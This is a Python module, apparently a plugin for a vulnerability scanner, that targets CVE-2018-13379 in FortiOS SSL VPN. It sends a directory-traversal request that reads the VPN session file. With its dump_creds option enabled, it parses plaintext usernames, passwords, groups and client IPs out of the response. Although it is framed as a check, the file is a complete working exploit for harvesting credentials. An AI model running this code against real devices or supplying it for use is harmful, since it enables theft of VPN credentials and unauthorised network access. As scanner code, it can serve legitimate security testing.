"""
CVE-2018-13379 | FG-IR-18-384
FortiOS SSL VPN Directory Traversal — plaintext credential extraction.
Affected: FortiOS 5.6.3-5.6.7, 6.0.0-6.0.4 with SSL VPN enabled.
"""

import ipaddress
import re
import socket
import ssl
import string
import urllib.error
import urllib.request

from .base import BaseCheck, CheckResult


class CVE_2018_13379(BaseCheck):
    CVE_ID = "CVE-2018-13379"
    DESCRIPTION = "SSL VPN Directory Traversal — Credential Dump"
    AFFECTED_VERSIONS = "FortiOS 5.6.3-5.6.7, 6.0.0-6.0.4"

    _TRAVERSAL = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
    _SIGNATURES = [bytearray([0x5D, 0x01]), bytearray([0x5C, 0x01]), bytearray([0x5F, 0x01])]
    _PRINTABLE = set(bytes(string.printable, "ascii"))

    def _cert_cn(self, host: str, port: int) -> str:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=10) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as tls:
                    cert = tls.getpeercert()
                    for field in cert.get("subject", []):
                        if field[0][0] == "commonName":
                            return field[0][1]
        except Exception:
            pass
        return "Unknown"

    def _is_valid_ip(self, s: str) -> bool:
        try:
            ipaddress.ip_address(s.strip())
            return True
        except ValueError:
            return False

    def _grab_text(self, data: bytes, start: int) -> str:
        out = ""
        for byte in data[start:]:
            if byte in self._PRINTABLE:
                out += chr(byte)
            else:
                break
        return out

    def _parse_creds(self, data: bytes) -> list:
        results = []
        comp = bytearray()
        counter = 0
        for byte in data:
            if byte == 0x00:
                counter += 1
                continue
            comp.append(byte)
            comp = comp[-2:]
            if comp in self._SIGNATURES:
                ext_ip = self._grab_text(data, counter + 1)
                if self._is_valid_ip(ext_ip):
                    results.append({
                        "username": self._grab_text(data, counter + 37),
                        "password": self._grab_text(data, counter + 423),
                        "group": self._grab_text(data, counter + 552),
                        "ext_ip": ext_ip,
                    })
            counter += 1
        return results

    def check(self, host: str, port: int, **kwargs) -> CheckResult:
        dump_creds = kwargs.get("dump_creds", False)
        addr = f"{host}:{port}"
        url = f"https://{addr}{self._TRAVERSAL}"

        nossl = ssl.create_default_context()
        nossl.check_hostname = False
        nossl.verify_mode = ssl.CERT_NONE

        try:
            resp = urllib.request.urlopen(url, context=nossl, timeout=10)
            body = resp.read()
        except urllib.error.HTTPError as e:
            return CheckResult(self.CVE_ID, addr, "PATCHED", f"HTTP {e.code} {e.reason}")
        except (urllib.error.URLError, OSError, TimeoutError) as e:
            return CheckResult(self.CVE_ID, addr, "ERROR", str(e))

        if resp.status != 200 or b"var fgt_lang =" not in body:
            return CheckResult(self.CVE_ID, addr, "PATCHED", "No session data in response")

        cn = self._cert_cn(host, port)
        extra: dict = {"serial": cn, "response_bytes": len(body)}
        detail = f"Vulnerable — {cn} ({len(body)} bytes)"

        if dump_creds:
            creds = self._parse_creds(body)
            extra["credentials"] = creds
            if creds:
                detail += f" — {len(creds)} credential set(s) extracted"

        return CheckResult(self.CVE_ID, addr, "VULNERABLE", detail, extra)
